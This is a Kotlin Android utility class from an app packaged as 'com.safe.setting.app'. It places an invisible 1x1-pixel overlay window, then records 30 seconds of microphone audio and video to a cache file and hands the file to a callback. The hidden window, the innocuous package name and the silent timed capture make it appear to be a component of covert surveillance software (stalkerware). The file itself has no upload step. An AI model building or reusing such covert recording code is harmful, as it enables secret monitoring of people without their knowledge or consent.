package com.safe.setting.app.utils

import android.content.Context
import android.graphics.PixelFormat
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.SurfaceView
import android.view.WindowManager
import java.io.File
import java.io.IOException

class VideoRecorderUtil(
    private val context: Context,
    private val callback: (File?) -> Unit
) {

    private var windowManager: WindowManager? = null
    private var surfaceView: SurfaceView? = null
    private var mediaRecorder: MediaRecorder? = null
    private var recordingFile: File? = null

    companion object {
        private const val TAG = "VideoRecorderUtil"
    }

    fun startRecording(i: Int) {
        try {
            setupSurface()
            recordingFile = File(context.cacheDir, "video_record_${System.currentTimeMillis()}.mp4")

            Handler(Looper.getMainLooper()).postDelayed({
                initializeRecorder()
                mediaRecorder?.start()
                Handler(Looper.getMainLooper()).postDelayed({ stopRecording() }, 30000) // 30 सेकंड बाद रिकॉर्डिंग बंद करें
            }, 500)

        } catch (e: Exception) {
            Log.e(TAG, "Error starting recording: ${e.message}")
            cleanup()
            callback(null)
        }
    }

    private fun setupSurface() {
        windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        surfaceView = SurfaceView(context)
        val windowType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }
        val params = WindowManager.LayoutParams(1, 1, windowType, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT)
        windowManager?.addView(surfaceView, params)
    }

    private fun initializeRecorder() {
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

        mediaRecorder?.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setOutputFile(recordingFile!!.absolutePath)
            setVideoEncodingBitRate(512 * 1000)
            setVideoFrameRate(30)
            setVideoSize(640, 480)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setPreviewDisplay(surfaceView!!.holder.surface)

            try {
                prepare()
            } catch (e: IOException) {
                Log.e(TAG, "MediaRecorder prepare() failed: ${e.message}")
                cleanup()
                callback(null)
            }
        }
    }

    private fun stopRecording() {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.reset()
            mediaRecorder?.release()
            mediaRecorder = null
            callback(recordingFile)
        } catch (e: RuntimeException) {
            Log.e(TAG, "Error stopping recording: ${e.message}")
            recordingFile?.delete()
            callback(null)
        } finally {
            cleanup()
        }
    }

    private fun cleanup() {
        if (surfaceView != null && windowManager != null) {
            windowManager?.removeView(surfaceView)
        }
        surfaceView = null
        windowManager = null
    }
}

